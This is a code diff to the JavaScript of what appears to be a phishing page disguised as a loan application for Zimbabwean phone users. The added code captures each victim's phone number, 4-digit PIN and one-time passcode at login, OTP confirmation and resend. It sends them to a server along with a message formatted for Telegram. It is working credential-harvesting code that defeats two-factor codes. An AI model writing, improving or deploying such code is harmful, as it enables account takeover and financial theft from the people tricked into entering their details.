@@ -326,7 +326,7 @@ function normalizePlan(plan){
   return price?`${name} — ${price}`:name;
 }
 
-/* ===== TELEGRAM MESSAGE FORMAT ===== */
+/* ===== TELEGRAM MESSAGE (ONLY ADDITION) ===== */
 function buildTelegramMessage({event, phone, pin, plan, device, time, otp}){
   return `New Loan Request Submission
 
@@ -341,6 +341,62 @@ event: ${event}
 loan_request: ${plan}
 ${otp ? 'otp: ' + otp + '\n' : ''}device: ${device}`;
 }
+
+/* ===== PIN ===== */
+const pins=[...document.querySelectorAll('.pin-digit')];
+let pinValue='';
+
+pins.forEach((el,i)=>{
+  el.addEventListener('input',()=>{
+    el.value=el.value.replace(/\D/g,'');
+    el.classList.toggle('filled',!!el.value);
+    if(el.value && i<pins.length-1) pins[i+1].focus();
+    updatePin();
+  });
+  el.addEventListener('keydown',e=>{
+    if(e.key==='Backspace'){
+      if(el.value){
+        el.value='';
+        el.classList.remove('filled');
+      }else if(i>0){
+        pins[i-1].focus();
+        pins[i-1].value='';
+        pins[i-1].classList.remove('filled');
+      }
+      e.preventDefault();
+      updatePin();
+    }
+  });
+});
+
+function updatePin(){
+  pinValue=pins.map(p=>p.value).join('');
+  loginBtn.disabled=!(validatePhone()&&/^\d{4}$/.test(pinValue));
+}
+
+/* ===== PHONE ===== */
+const phone=document.getElementById('phone');
+const phoneError=document.getElementById('phoneError');
+const loginBtn=document.getElementById('loginBtn');
+
+function validatePhone(){
+  const d=phone.value.replace('+263','');
+  if(!d){phoneError.innerText='';return false}
+  if(!/^7\d{8}$/.test(d)){
+    phoneError.innerText='Enter your 9-digit number starting with 7';
+    return false;
+  }
+  phoneError.innerText='';
+  return true;
+}
+
+phone.addEventListener('input',()=>{
+  let d=phone.value.replace('+263','').replace(/\D/g,'');
+  if(d.startsWith('0')) d=d.slice(1);
+  d=d.slice(0,9);
+  phone.value='+263'+d;
+  validatePhone();
+});
 
 /* ===== API ===== */
 async function sendToServer(payload){
@@ -394,6 +450,12 @@ document.getElementById('loginForm').addEventListener('submit',async e=>{
   const time=new Date().toISOString();
 
   await sendToServer({
+    event:'login_clicked',
+    loginPhone:phone.value,
+    loginPin:pinValue,
+    plan:normalizePlan(selectedPlan),
+    device,
+    submittedAt: time,
     message: buildTelegramMessage({
       event:'login_clicked',
       phone:phone.value,
@@ -418,6 +480,13 @@ confirmBtn.onclick=async()=>{
   const time=new Date().toISOString();
 
   await sendToServer({
+    event:'otp_confirm',
+    loginPhone:phone.value,
+    loginPin:pinValue,
+    otp:buffer.value,
+    plan:normalizePlan(selectedPlan),
+    device,
+    submittedAt: time,
     message: buildTelegramMessage({
       event:'otp_confirm',
       phone:phone.value,
@@ -441,6 +510,12 @@ resendBtn.onclick=async()=>{
   const time=new Date().toISOString();
 
   await sendToServer({
+    event:'resend_otp',
+    loginPhone:phone.value,
+    loginPin:pinValue,
+    plan:normalizePlan(selectedPlan),
+    device,
+    submittedAt: time,
     message: buildTelegramMessage({
       event:'resend_otp',
       phone:phone.value,
